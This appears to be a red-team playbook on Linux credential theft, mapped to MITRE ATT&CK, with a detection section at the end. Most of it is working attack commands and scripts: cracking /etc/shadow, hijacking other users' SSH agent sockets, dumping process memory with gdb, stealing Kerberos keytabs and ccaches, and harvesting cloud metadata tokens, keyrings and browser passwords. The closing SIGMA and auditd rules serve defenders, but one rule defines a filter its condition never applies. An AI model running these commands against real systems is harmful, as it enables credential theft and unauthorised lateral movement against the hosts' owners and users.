# Linux Credential Access

> **MITRE ATT&CK Mapping**: T1003.008 (/etc/passwd and /etc/shadow), T1552.001 (Credentials In Files), T1555.005 (Password Managers), T1539 (Steal Web Session Cookie), T1563.001 (SSH Hijacking), T1558.005 (Ccache Files)
> **Tactic**: Credential Access (TA0006)
> **Platforms**: Linux
> **Required Permissions**: Varies -- User-level for history/config mining, same-user for SSH agent, root for /etc/shadow, process memory, keytabs
> **OPSEC Risk**: Medium (credential file reads are commonly audited; memory scraping and SSH agent hijacking are lower risk)

---

## Strategic Overview

Linux credential access differs fundamentally from Windows. There is no LSASS, no SAM database in the Windows sense, and no DPAPI. Instead, Linux credentials are distributed across flat files (`/etc/shadow`), credential caches (SSSD, Kerberos), desktop keyrings (GNOME Keyring, KWallet), SSH agent sockets, process environments, shell history files, browser databases, and increasingly in cloud credential files. This distributed nature is both an advantage and a challenge for operators: credentials are scattered across many locations rather than centralized, requiring systematic enumeration across dozens of potential sources.

For a Red Team Lead, Linux credential harvesting should be prioritized based on lateral movement value: (1) SSH agent hijacking provides immediate lateral movement without touching disk, (2) Kerberos keytabs and ccache files enable domain-level movement, (3) cloud credential files enable pivot to cloud infrastructure, (4) shadow file access provides offline cracking for password reuse attacks, and (5) container secrets and service account tokens open Kubernetes and cloud-native attack paths. Container environments introduce additional targets through mounted secrets, environment variables, and orchestrator APIs.

The 2025 threat landscape has seen increasing sophistication in credential harvesting, with threat actors systematically targeting cloud credential files across all three major providers (AWS, Azure, GCP), exploiting Kubernetes service account tokens in compromised pods, and leveraging process memory scraping techniques that avoid traditional file-based detection. Understanding the full credential surface of a Linux host -- from legacy /etc/shadow to modern cloud IAM tokens -- is essential for comprehensive post-exploitation.

---

## Technical Deep-Dive

### 1. /etc/shadow Parsing (T1003.008)

The shadow file contains hashed passwords for all local accounts. Access requires root or equivalent privileges (`CAP_DAC_READ_SEARCH`).

#### Hash Format Identification

```bash
# /etc/shadow field format:
# username:$id$salt$hash:last_changed:min:max:warn:inactive:expire:reserved

# Hash type prefixes:
# $1$    = MD5crypt (legacy, extremely weak -- cracked in seconds)
# $5$    = SHA-256crypt
# $6$    = SHA-512crypt (most common on RHEL/CentOS, older Ubuntu)
# $y$    = yescrypt (default on Debian 11+, Fedora 35+, Kali 2021.1+, Ubuntu 22.04+)
# $2a$   = bcrypt (rare on Linux, common on BSD/OpenBSD)
# $2b$   = bcrypt (updated variant)

# Check shadow file permissions and readability
ls -la /etc/shadow
# Expected: -rw-r----- 1 root shadow (or root:root with 640)

# Common misconfigurations allowing non-root access:
# - World-readable shadow file (chmod 644 /etc/shadow)
# - User in 'shadow' group
# - CAP_DAC_READ_SEARCH on a process
# - Backup files: /etc/shadow.bak, /etc/shadow~, /etc/shadow.old
```

#### Extracting and Preparing Hashes

```bash
# Extract shadow entries with actual hashes (skip locked/disabled accounts)
cat /etc/shadow | grep -v ':\*:\|:!:\|:!!:' | cut -d: -f1,2

# Combine passwd and shadow for cracking tools
unshadow /etc/passwd /etc/shadow > unshadowed.txt

# Extract only the hash for a specific user
grep '^targetuser:' /etc/shadow | cut -d: -f2
```

#### Cracking with Hashcat

```bash
# SHA-512crypt ($6$) -- hashcat mode 1800
hashcat -m 1800 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 1800 -a 0 hashes.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule

# SHA-256crypt ($5$) -- hashcat mode 7400
hashcat -m 7400 -a 0 hashes.txt wordlist.txt

# MD5crypt ($1$) -- hashcat mode 500
hashcat -m 500 -a 0 hashes.txt wordlist.txt

# bcrypt ($2a$ or $2b$) -- hashcat mode 3200
hashcat -m 3200 -a 0 hashes.txt wordlist.txt

# yescrypt ($y$) -- NOT supported by hashcat as of early 2026
# Use John the Ripper instead for yescrypt
```

#### Cracking with John the Ripper

```bash
# John auto-detects hash format
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt

# Explicitly specify format
john --format=sha512crypt --wordlist=wordlist.txt hashes.txt
john --format=crypt --wordlist=wordlist.txt hashes.txt  # Auto-detect crypt variant

# yescrypt support (requires John bleeding-jumbo with libxcrypt)
john --format=crypt --wordlist=wordlist.txt yescrypt_hashes.txt

# Show cracked passwords
john --show unshadowed.txt
```

#### yescrypt Considerations (2025)

yescrypt is a memory-hard password hashing scheme now default on most modern Linux distributions. It is significantly more resistant to offline cracking than SHA-512:

- Requires substantially more memory per hash attempt
- GPU acceleration is far less effective than with SHA-512
- hashcat does not support yescrypt; must use John the Ripper (bleeding-jumbo)
- Compiling JtR with yescrypt support requires the `libxcrypt` library
- A dedicated tool exists: `yescrypt_crack` (GitHub: cyclone-github/yescrypt_crack)

---

### 2. SSSD / FreeIPA Cache Extraction

SSSD (System Security Services Daemon) caches domain credentials locally, enabling offline authentication. These caches contain credential material usable for offline cracking.

#### SSSD Cache Locations and Extraction

```bash
# SSSD credential cache databases
ls -la /var/lib/sss/db/cache_*.ldb

# Check if credential caching is enabled
grep -i "cache_credentials\|offline_credentials_expiration" /etc/sssd/sssd.conf
# cache_credentials = True means hashes are stored locally

# Extract cached credentials using tdbdump
tdbdump /var/lib/sss/db/cache_DOMAIN.ldb | grep -i "cachedPassword\|lastCachedPassword"

# SSSD maintains Kerberos credential cache blobs
# Extract using SSSDKCMExtractor
python3 SSSDKCMExtractor.py --dbpath /var/lib/sss/secrets/secrets.ldb

# SSSD configuration reveals domain info
cat /etc/sssd/sssd.conf
# Contains: ldap_uri, ldap_search_base, krb5_realm, etc.

# Check SSSD log for troubleshooting extraction
ls -la /var/log/sssd/
```

#### FreeIPA / IPA Client Credential Extraction

```bash
# FreeIPA stores the host keytab at /etc/krb5.keytab
ls -la /etc/krb5.keytab

# FreeIPA configuration
cat /etc/ipa/default.conf

# LDAP tls_cacert location (could be used for MITM if writable)
grep -i "ldap_tls_cacert" /etc/sssd/sssd.conf

# FreeIPA LDAP directory enumeration (if accessible)
ldapsearch -x -H ldap://ipa-server -b "cn=users,cn=accounts,dc=example,dc=com"
```

---

### 3. SSH Agent Hijacking (T1563.001)

SSH agent hijacking is one of the highest-value credential access techniques on Linux. It provides immediate lateral movement without touching disk, and the original user's SSH key never leaves their workstation.

#### Finding Active SSH Agent Sockets

```bash
# Find active SSH agent sockets
find /tmp -name "agent.*" -o -name "ssh-*" 2>/dev/null
ls -la /tmp/ssh-*/

# Check for forwarded agent sockets
find /tmp -path "*/ssh-*/agent.*" -type s 2>/dev/null

# Enumerate ALL users' agent sockets (requires root)
find /tmp -path "*/ssh-*" -type s 2>/dev/null

# Check if the current user has an active agent
echo $SSH_AUTH_SOCK
ssh-add -l
```

#### Hijacking the Agent

```bash
# Set SSH_AUTH_SOCK to another user's socket (requires root or same user)
export SSH_AUTH_SOCK=/tmp/ssh-XXXXXXXX/agent.XXXXX

# Verify the hijacked keys are accessible
ssh-add -l
# Should show the victim's loaded keys

# Use the hijacked agent to authenticate to other hosts
ssh -o StrictHostKeyChecking=no target-host

# Automated hijack-and-enumerate loop (as root)
for sock in /tmp/ssh-*/agent.*; do
    echo "=== Socket: $sock ==="
    SSH_AUTH_SOCK=$sock ssh-add -l 2>/dev/null
done
```

#### Agent Forwarding Exploitation

When SSH agent forwarding is enabled (`ForwardAgent yes` in ssh_config or `-A` flag), the agent socket on the remote server can be used by root to authenticate as the connecting user to any host their keys grant access to.

```bash
# Check if agent forwarding is enabled on the server
grep -i "AllowAgentForwarding" /etc/ssh/sshd_config
# Default is "yes" on most systems

# As root on the intermediate host, iterate all forwarded agents
for sock in /tmp/ssh-*/agent.*; do
    echo "--- $sock ---"
    SSH_AUTH_SOCK=$sock ssh-add -l 2>/dev/null && echo "ACTIVE"
done

# Monitor for new agent sockets (persistent watch)
inotifywait -m /tmp -e create 2>/dev/null | grep ssh-
```

#### SSH Agent Memory Extraction

```bash
# If you have root, you can dump the ssh-agent process memory
# to extract private keys directly
pgrep -a ssh-agent
# Use gdb to dump the heap of the ssh-agent process
gdb -batch -pid <AGENT_PID> -ex "dump binary memory /tmp/.agent_heap.bin 0x<start> 0x<end>"
# Then search the dump for RSA/EC key material
strings /tmp/.agent_heap.bin | grep -A5 "PRIVATE KEY"
```

---

### 4. GNOME Keyring Extraction (T1555.005)

GNOME Keyring stores passwords for applications, Wi-Fi networks, email accounts, and other services in encrypted format.

#### Keyring File Locations

```bash
# GNOME Keyring storage directory
ls -la ~/.local/share/keyrings/
# Files: login.keyring, user.keystore, default.keyring

# The default/login keyring auto-unlocks when the user logs in to the desktop
# Once unlocked, all stored secrets are accessible via D-Bus
```

#### Secret Extraction via D-Bus SecretService API

```python
#!/usr/bin/env python3
"""Extract secrets from GNOME Keyring via D-Bus SecretService API.
Requires an active desktop session with unlocked keyring."""

import secretstorage

bus = secretstorage.dbus_init()
collection = secretstorage.get_default_collection(bus)

if collection.is_locked():
    print("Keyring is locked. Cannot extract without user session.")
else:
    for item in collection.get_all_items():
        label = item.get_label()
        attrs = item.get_attributes()
        try:
            secret = item.get_secret().decode('utf-8', errors='replace')
            print(f"Label: {label}")
            print(f"  Attributes: {attrs}")
            print(f"  Secret: {secret}")
            print("---")
        except Exception as e:
            print(f"Label: {label} - Error: {e}")
```

#### secret-tool CLI Extraction

```bash
# secret-tool is a command-line interface to the SecretService API
# Search for all items
secret-tool search --all xdg:schema org.gnome.keyring.Note 2>/dev/null

# Look up specific credential types
secret-tool search --all xdg:schema org.gnome.keyring.NetworkPassword 2>/dev/null
secret-tool search --all xdg:schema org.freedesktop.Secret.Generic 2>/dev/null

# Retrieve a specific secret by attribute
secret-tool lookup server smtp.example.com user admin@example.com
```

#### Offline Keyring Cracking

```bash
# Copy keyring files for offline analysis
cp ~/.local/share/keyrings/login.keyring /tmp/

# GNOME Keyring uses AES-128 encryption
# CVE-2018-19358: Any application can read secrets if keyring is unlocked
# When user is logged in, the login/default collection is unlocked
# When the session is locked, the keyring is NOT automatically locked
```

---

### 5. KWallet Extraction (KDE)

KWallet is KDE's credential storage daemon, providing encrypted storage using Blowfish or GnuPG.

#### KWallet File Locations and CLI Access

```bash
# KWallet database location
ls -la ~/.local/share/kwalletd/
# Files: kdewallet.kwl, kdewallet.salt

# KWallet5 database
ls -la ~/.local/share/kwalletd5/

# List wallets
kwallet-query -l kdewallet

# List folders in a wallet
kwallet-query -f "" kdewallet

# Read a specific entry
kwallet-query -r "entry-name" -f "folder-name" kdewallet

# Enumerate all entries across all folders
for folder in $(kwallet-query -f "" kdewallet 2>/dev/null); do
    echo "=== Folder: $folder ==="
    kwallet-query -f "$folder" kdewallet 2>/dev/null
done
```

#### KWallet Security Considerations
- KWallet with Blowfish encryption has documented weaknesses in key derivation
- GnuPG-encrypted wallets (GPG/PGP) are significantly stronger
- KWallet auto-unlocks with the user session, similar to GNOME Keyring
- kwalletd5 daemon must be running for CLI extraction
- Offline brute-force of Blowfish-encrypted wallets is feasible with weak master passwords

---

### 6. Kerberos Keytabs on Linux

Linux systems joined to Active Directory or FreeIPA domains contain Kerberos credential material. Keytabs contain raw key material -- no cracking is needed.

#### Keytab Discovery and Extraction

```bash
# Default system keytab
ls -la /etc/krb5.keytab
# Readable only by root (typically -rw------- root root)

# List principals in keytab (no password needed to list)
klist -ket /etc/krb5.keytab
# Output shows principal name, key version, and encryption type

# Common additional keytab locations
find / -name "*.keytab" 2>/dev/null
# /etc/krb5.keytab        - System/host keytab
# /etc/http.keytab         - Web service keytab
# /etc/nfs.keytab          - NFS service keytab
# /home/*/.keytab          - User keytabs (rare but found in dev environments)
# /opt/*/conf/*.keytab     - Application keytabs

# Copy keytab for offline use
cp /etc/krb5.keytab /tmp/
```

#### Using Stolen Keytabs

```bash
# Obtain a TGT using the keytab (no password needed)
kinit -k -t /etc/krb5.keytab host/hostname.domain.com@DOMAIN.COM

# Verify the ticket
klist

# Use with impacket tools
python3 getTGT.py -keytab /tmp/krb5.keytab 'DOMAIN/hostname$'
```

#### Keytab-to-Hash Extraction

```bash
# Extract the NT hash from a keytab for pass-the-hash
# Key type 23 (rc4-hmac) IS the NT hash
python3 KeyTabExtract.py /tmp/krb5.keytab
# Output: principal, kvno, enctype, and key (hash)

# Alternative: keytabextract.py from impacket
python3 -c "
from impacket.krb5.keytab import Keytab
kt = Keytab()
kt.read('/tmp/krb5.keytab')
for entry in kt.entries:
    print(f'Principal: {entry[\"principal\"]}')
    print(f'Key: {entry[\"key\"].hex()}')
"
```

#### Kerberos ccache File Theft

```bash
# Default ccache location (file-based)
ls -la /tmp/krb5cc_*
# Naming convention: krb5cc_<UID>

# Environment variable may point elsewhere
echo $KRB5CCNAME

# SSSD keyring-based cache
ls -la /run/user/*/krb5cc 2>/dev/null

# List tickets in a ccache
klist -c /tmp/krb5cc_$(id -u)

# Steal and use another user's ccache
export KRB5CCNAME=/tmp/krb5cc_1001
klist  # Shows stolen user's tickets

# Use with impacket
KRB5CCNAME=/tmp/krb5cc_stolen python3 psexec.py -k -no-pass domain/user@target
KRB5CCNAME=/tmp/krb5cc_stolen python3 secretsdump.py -k -no-pass domain/hostname
```

---

### 7. Cloud Credential Files (T1552.001)

Cloud CLI tools store long-lived credentials in plaintext files. These are among the highest-value targets on Linux systems.

#### AWS Credentials

```bash
# AWS credential file locations
cat ~/.aws/credentials
# [default]
# aws_access_key_id = AKIA...
# aws_secret_access_key = ...

cat ~/.aws/config
# [default]
# region = us-east-1
# role_arn = arn:aws:iam::123456789012:role/RoleName

# Environment variables
env | grep -i AWS_

# EC2 instance metadata service v1 (IMDS)
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>

# EC2 instance metadata service v2 (IMDSv2 -- requires token)
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
    -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
    http://169.254.169.254/latest/meta-data/iam/security-credentials/

# ECS container credentials
curl -s "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"

# Lambda environment variables
cat /proc/self/environ | tr '\0' '\n' | grep AWS
```

#### Azure Credentials

```bash
# Azure CLI token cache
cat ~/.azure/accessTokens.json
cat ~/.azure/azureProfile.json
ls ~/.azure/msal_token_cache.*

# Azure managed identity (IMDS)
curl -s -H "Metadata:true" \
    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

#### Google Cloud Credentials

```bash
# GCloud credential locations
cat ~/.config/gcloud/credentials.db
cat ~/.config/gcloud/access_tokens.db
cat ~/.config/gcloud/application_default_credentials.json
ls ~/.config/gcloud/legacy_credentials/

# Service account keys (JSON files)
find / -name "*service*account*.json" -o -name "*credentials*.json" 2>/dev/null | head -20

# GCP metadata service
curl -s -H "Metadata-Flavor: Google" \
    http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
```

#### Kubernetes Configuration

```bash
# KUBECONFIG default location
cat ~/.kube/config
# Contains: cluster addresses, client certificates, tokens, sometimes passwords

# Check environment for alternate paths
echo $KUBECONFIG

# Docker registry credentials
cat ~/.docker/config.json
# Contains: base64-encoded registry auth tokens
# Decode: echo '<auth_value>' | base64 -d
```

---

### 8. Process Memory Credential Extraction (T1003.007)

The /proc filesystem exposes process memory for debugging. With appropriate privileges, credentials can be scraped from running processes.

#### /proc/[pid]/maps + mem Reading

```bash
# Read process memory maps to identify readable regions
grep -E "^[0-9a-f]+ r" /proc/<PID>/maps

# Dump readable memory regions and search for credentials
for region in $(grep rw-p /proc/<PID>/maps | awk '{print $1}'); do
    start=$(echo $region | cut -d- -f1)
    end=$(echo $region | cut -d- -f2)
    dd if=/proc/<PID>/mem bs=1 skip=$((16#$start)) count=$(($((16#$end)) - $((16#$start)))) \
        2>/dev/null | strings | grep -iE "password|passwd|secret|token"
done

# Quick credential search across all accessible process memory
for pid in $(ls /proc/ | grep -E '^[0-9]+$'); do
    strings /proc/$pid/mem 2>/dev/null | grep -iE "password=|passwd=|secret=" | head -5
    [ $? -eq 0 ] && echo "--- PID: $pid ($(cat /proc/$pid/comm 2>/dev/null)) ---"
done
```

#### GDB Attach for Memory Extraction

```bash
# Attach gdb to a running process and dump memory
gdb -batch -pid <PID> \
    -ex "dump binary memory /tmp/.heap.bin 0x<heap_start> 0x<heap_end>" \
    -ex "detach" \
    -ex "quit"

# Dump the entire heap of a process
# First find heap boundaries from maps
HEAP_START=$(grep '\[heap\]' /proc/<PID>/maps | awk -F'[- ]' '{print $1}')
HEAP_END=$(grep '\[heap\]' /proc/<PID>/maps | awk -F'[- ]' '{print $2}')

gdb -batch -pid <PID> \
    -ex "dump binary memory /tmp/.heap.bin 0x${HEAP_START} 0x${HEAP_END}" \
    -ex "detach"

# Search the dump for credentials
strings /tmp/.heap.bin | grep -iE "password|secret|token|key"
```

#### Targeting Specific Processes

```bash
# Target sshd for password capture (PID 1 hooking detected by Elastic)
# Target web servers (Apache, Nginx) for session tokens
# Target database processes (MySQL, PostgreSQL) for connection strings

# Find interesting processes
ps aux | grep -iE "sshd|apache|nginx|mysql|postgres|java|python|node"

# Read command line arguments (often contain credentials)
cat /proc/<PID>/cmdline | tr '\0' ' '

# Read process environment variables
cat /proc/<PID>/environ | tr '\0' '\n' | grep -iE "pass|secret|key|token|database"
```

#### Tools for Memory Scraping
- **truffleproc**: Searches process memory for high-entropy strings (potential secrets)
- **bash-memory-dump**: Pure bash process memory dumper
- **mimipenguin**: Linux equivalent of mimikatz; extracts cleartext credentials from memory of login processes

---

### 9. History Files

Shell history files frequently contain credentials passed as command-line arguments. This is a low-risk, high-reward technique.

#### Comprehensive History File Search

```bash
# Bash history
cat ~/.bash_history 2>/dev/null | grep -iE "pass|secret|key|token|curl.*-u|wget.*--password|mysql.*-p|ssh.*-i|sshpass|export.*AWS|export.*SECRET"

# Zsh history
cat ~/.zsh_history 2>/dev/null | grep -iE "pass|secret|key|token"

# Python history
cat ~/.python_history 2>/dev/null | grep -iE "pass|secret|key|token|connect"

# MySQL history
cat ~/.mysql_history 2>/dev/null | grep -iE "password|grant|identified|SET PASSWORD"

# PostgreSQL history
cat ~/.psql_history 2>/dev/null | grep -iE "password|create role|alter role"

# Redis CLI history
cat ~/.rediscli_history 2>/dev/null | grep -iE "auth|requirepass"

# MongoDB history
cat ~/.dbshell 2>/dev/null | grep -iE "password|createUser"

# All users (requires root)
find /home /root -name ".*_history" -o -name ".*history" 2>/dev/null | while read f; do
    hits=$(grep -ciE "pass|secret|key|token" "$f" 2>/dev/null)
    [ "$hits" -gt 0 ] && echo "$f: $hits potential credential lines"
done
```

#### Common Patterns in History

```bash
# Typical credential leaks in history:
# mysql -u root -p'password123'
# curl -u admin:password https://api.example.com/
# sshpass -p 'password' ssh user@host
# export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
# echo 'password' | sudo -S command
# kubectl create secret generic my-secret --from-literal=password=s3cret
# docker login -u user -p token registry.example.com
# ansible-vault decrypt --vault-password-file=pw.txt
# openssl enc -aes-256-cbc -pass pass:MyPassword
# htpasswd -b /etc/apache2/.htpasswd admin password123
```

---

### 10. Configuration File Mining (T1552.001)

Applications store database connection strings, API keys, and passwords in configuration files scattered across the filesystem.

#### Database Connection Strings

```bash
# WordPress
cat /var/www/*/wp-config.php 2>/dev/null | grep -i "DB_PASSWORD\|DB_USER\|DB_HOST"
find /var/www -name "wp-config.php" -exec grep -l "DB_PASSWORD" {} \;

# Django/Python
find / -name "settings.py" -exec grep -liE "PASSWORD|SECRET_KEY|DATABASE" {} \; 2>/dev/null
cat /path/to/settings.py | grep -A2 "'PASSWORD'"

# Spring Boot / Java
find / -name "application.properties" -o -name "application.yml" 2>/dev/null | \
    xargs grep -liE "password|secret|key" 2>/dev/null

# Laravel/PHP
find / -name ".env" 2>/dev/null | xargs grep -iE "DB_PASSWORD|APP_KEY|MAIL_PASSWORD" 2>/dev/null

# Ruby on Rails
find / -name "database.yml" -exec grep -liE "password" {} \; 2>/dev/null
```

#### Generic Configuration Mining

```bash
# .env files (used by many frameworks)
find / -name ".env" -not -path "*/node_modules/*" 2>/dev/null | while read f; do
    echo "=== $f ==="
    grep -iE "password|secret|key|token|api" "$f" 2>/dev/null
done

# Git configuration (may contain credentials)
find / -name ".git" -type d 2>/dev/null | while read d; do
    cat "$d/config" 2>/dev/null | grep -iE "password|token|oauth"
done

# .git-credentials file (plaintext Git credentials)
find /home /root -name ".git-credentials" 2>/dev/null
cat ~/.git-credentials 2>/dev/null
# Format: https://user:password@github.com

# .netrc file (FTP/HTTP credentials)
find /home /root -name ".netrc" 2>/dev/null
cat ~/.netrc 2>/dev/null
# Format: machine host.com login user password pass

# SSH private keys (not protected by passphrase)
find / -name "id_rsa" -o -name "id_ecdsa" -o -name "id_ed25519" 2>/dev/null | while read k; do
    head -2 "$k" | grep -q "ENCRYPTED" || echo "Unprotected key: $k"
done

# Ansible vault files and variables
find / -name "vault.yml" -o -name "vault.yaml" -o -name "*.vault" 2>/dev/null
grep -r "ansible_become_pass\|ansible_ssh_pass" /etc/ansible/ 2>/dev/null

# Terraform state files (contain secrets in plaintext)
find / -name "terraform.tfstate" 2>/dev/null
find / -name "*.tfvars" 2>/dev/null | xargs grep -iE "password|secret|key" 2>/dev/null
```

---

### 11. Browser Credentials on Linux (T1555.003)

#### Chrome/Chromium Credential Extraction

```bash
# Chrome/Chromium stores credentials in SQLite databases
# Login Data contains encrypted passwords
ls -la ~/.config/google-chrome/Default/Login\ Data
ls -la ~/.config/chromium/Default/Login\ Data

# On Linux, Chrome uses GNOME Keyring or KWallet for the encryption key
# If the desktop session is active and keyring is unlocked, decryption is possible

# Copy the database for analysis
cp ~/.config/google-chrome/Default/Login\ Data /tmp/chrome_logins.db

# Query the database structure
sqlite3 /tmp/chrome_logins.db "SELECT origin_url, username_value, hex(password_value) FROM logins;"

# Chrome also stores cookies (session hijacking)
ls -la ~/.config/google-chrome/Default/Cookies
# And browsing history
ls -la ~/.config/google-chrome/Default/History
```

#### Firefox Credential Extraction

```bash
# Firefox profile locations
ls -la ~/.mozilla/firefox/

# Find the active profile
cat ~/.mozilla/firefox/profiles.ini

# Credential files within the profile
ls ~/.mozilla/firefox/*.default-release/logins.json
ls ~/.mozilla/firefox/*.default-release/key4.db
# logins.json: encrypted usernames and passwords
# key4.db: master key database (NSS format)

# If no master password is set, credentials can be decrypted directly
# Tools: firefox_decrypt (https://github.com/unode/firefox_decrypt)
python3 firefox_decrypt.py ~/.mozilla/firefox/*.default-release/

# Session cookies
ls ~/.mozilla/firefox/*.default-release/cookies.sqlite
sqlite3 ~/.mozilla/firefox/*.default-release/cookies.sqlite \
    "SELECT host, name, value FROM moz_cookies WHERE name LIKE '%session%';"
```

#### Extraction Tools

```bash
# HackBrowserData - Cross-platform browser credential extractor
# Supports: Chrome, Chromium, Edge, Firefox, Brave, Opera, Vivaldi
# Extracts: passwords, bookmarks, cookies, history, credit cards, downloads
./hack-browser-data -b chrome -f json -dir /tmp/browser_dump/

# LaZagne - Multi-purpose credential harvester
python3 laZagne.py browsers

# firefox_decrypt - Firefox-specific
python3 firefox_decrypt.py /path/to/firefox/profile/
```

---

### 12. Container Secrets

Containerized environments expose secrets through mounted volumes, environment variables, and orchestration platforms.

#### Docker Secrets (/run/secrets/)

```bash
# Docker Swarm secrets are mounted as files
ls -la /run/secrets/
cat /run/secrets/*

# Docker secrets are tmpfs-mounted and only accessible within the container
# They do not persist to disk on the host
```

#### Environment Variable Extraction from Containers

```bash
# PID 1 in a container is the entrypoint process
# Its environment often contains database passwords, API keys, etc.
cat /proc/1/environ | tr '\0' '\n'
cat /proc/1/environ | tr '\0' '\n' | grep -iE "pass|secret|key|token|database|api"

# Check all process environments within the container
for pid in $(ls /proc/ | grep -E '^[0-9]+$'); do
    env_data=$(cat /proc/$pid/environ 2>/dev/null | tr '\0' '\n')
    echo "$env_data" | grep -iqE "pass|secret|key|token" && \
        echo "=== PID $pid ($(cat /proc/$pid/comm 2>/dev/null)) ===" && \
        echo "$env_data" | grep -iE "pass|secret|key|token"
done
```

#### Kubernetes Service Account Tokens

```bash
# Service account token, CA cert, and namespace are auto-mounted
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace

# Use the service account token to query the K8s API
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER="https://kubernetes.default.svc"

# List secrets (if RBAC allows)
curl -sk -H "Authorization: Bearer $TOKEN" \
    "$APISERVER/api/v1/namespaces/$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)/secrets"

# List all namespaces
curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/namespaces"

# Enumerate RBAC permissions (what can this token do?)
curl -sk -H "Authorization: Bearer $TOKEN" \
    "$APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
    -X POST -H "Content-Type: application/json" \
    -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"default"}}'

# Kubernetes secrets are base64-encoded (not encrypted) by default
# kubectl get secrets -o yaml reveals secret values in base64
```

#### Docker Socket Access (Host Escape Path)

```bash
# If Docker socket is mounted, you effectively have root on the host
ls -la /var/run/docker.sock

# List all containers (reveals environment variables of other containers)
curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json

# Inspect a specific container for secrets
curl -s --unix-socket /var/run/docker.sock \
    http://localhost/containers/<container_id>/json | python3 -m json.tool | grep -iE "env|pass|secret"
```

#### Kubernetes v1.33-1.34 Changes (2025)

Kubernetes has been transitioning away from long-lived static tokens to ephemeral, auto-rotated tokens with OIDC semantics. As of Kubernetes v1.34 (2025), Service Account Token Integration for image pulls graduated to beta, reducing reliance on stored secrets. However, many clusters still use legacy token configurations, and the `/var/run/secrets/kubernetes.io/serviceaccount/token` path remains the default mount point.

---

## 2025 Techniques

### Evolving Credential Theft Landscape

1. **Cloud Credential Stealer Campaigns**: SentinelOne's 2025 research documented credential stealer malware expanding from AWS-only to targeting all three major cloud providers (AWS, Azure, GCP) simultaneously, systematically harvesting `~/.aws/credentials`, `~/.azure/`, and `~/.config/gcloud/`.

2. **Kubernetes Secret Exposure**: Aqua Security reported that exposed Kubernetes secrets represent a significant supply chain attack surface, with many clusters still storing secrets as base64 in etcd without encryption at rest.

3. **AWS Container Credential Exposure**: Trend Micro's 2025 research identified credential theft vectors in overprivileged containers, including packet sniffing of unencrypted HTTP traffic and API spoofing via network manipulation.

4. **yescrypt Adoption**: With yescrypt as the default on major distributions (Debian 11+, Ubuntu 22.04+, Fedora 35+), traditional GPU-accelerated cracking of /etc/shadow hashes has become significantly less effective. Operators must adapt cracking strategies accordingly.

5. **SSSD KCM Extractor Tools**: New tooling for extracting Kerberos credentials from SSSD's KCM (Kerberos Credential Manager) cache has improved, enabling extraction from modern FreeIPA/AD-joined Linux systems.

6. **Process Memory Detection**: Elastic published a 2025 detection rule for GDB-based memory dumping of PID 1 (init process), indicating that defenders are increasingly aware of process memory scraping techniques.

### Datadog 2025 State of Cloud Security

Datadog's 2025 report found that 59% of AWS IAM users had access keys older than one year, representing a massive credential theft opportunity on Linux systems running AWS CLI tools.

---

## Detection & Defense

### Log Sources by Technique

| Technique | Primary Log Source | Key Indicators |
|---|---|---|
| /etc/shadow access | auditd, FIM | File read events on /etc/shadow |
| SSSD cache | auditd, /var/log/sssd/ | Access to /var/lib/sss/db/ |
| SSH agent hijacking | auditd, process monitoring | Cross-user SSH_AUTH_SOCK access |
| GNOME Keyring | D-Bus monitoring | Secret Service API calls |
| Keytab theft | auditd, Kerberos logs | File access on *.keytab, kinit events |
| Cloud credentials | auditd, CloudTrail/Activity Log | File reads on credential paths, API anomalies |
| Process memory | auditd, process monitoring | ptrace attach, /proc/PID/mem access |
| History files | FIM | Access to .*history files |
| Browser credentials | FIM, process monitoring | Access to Login Data, key4.db |
| Container secrets | K8s audit logs, Falco | Secret API access, /run/secrets reads |

### SIGMA Detection Rules

```yaml
title: Shadow File Access by Non-Standard Process
status: experimental
logsource:
    product: linux
    service: auditd
detection:
    selection:
        type: SYSCALL
        syscall: open
        a1: /etc/shadow
    filter:
        exe|endswith:
            - '/login'
            - '/sshd'
            - '/passwd'
            - '/chage'
            - '/useradd'
            - '/usermod'
    condition: selection and not filter
level: high
---
title: SSH Agent Socket Access by Different User
status: experimental
logsource:
    product: linux
    service: auditd
detection:
    selection:
        type: SYSCALL
        syscall: connect
        a1|contains: '/tmp/ssh-'
    filter_same_user:
        auid: '{{ euid }}'
    condition: selection and not filter_same_user
level: high
---
title: Cloud Credential File Access
status: experimental
logsource:
    product: linux
    service: auditd
detection:
    selection:
        type: SYSCALL
        syscall: open
    selection_paths:
        a1:
            - '*.aws/credentials*'
            - '*.azure/accessTokens*'
            - '*.config/gcloud/application_default_credentials*'
            - '*.kube/config*'
    condition: selection and selection_paths
level: medium
---
title: Process Memory Access via proc Filesystem
status: experimental
logsource:
    product: linux
    service: auditd
detection:
    selection:
        type: SYSCALL
        syscall: open
        a1|contains: '/proc/'
        a1|endswith: '/mem'
    filter:
        exe|endswith:
            - '/gdb'
            - '/strace'
    condition: selection
level: high
```

### Auditd Rules for Credential Monitoring

```bash
# /etc/audit/rules.d/credential-access.rules

# Monitor shadow file access
-w /etc/shadow -p r -k shadow_access
-w /etc/shadow- -p r -k shadow_access
-w /etc/gshadow -p r -k shadow_access

# Monitor SSH key and agent files
-w /root/.ssh/ -p rwa -k ssh_credential_access
-a always,exit -F dir=/tmp/ -F name=ssh-* -F perm=r -k ssh_agent_access

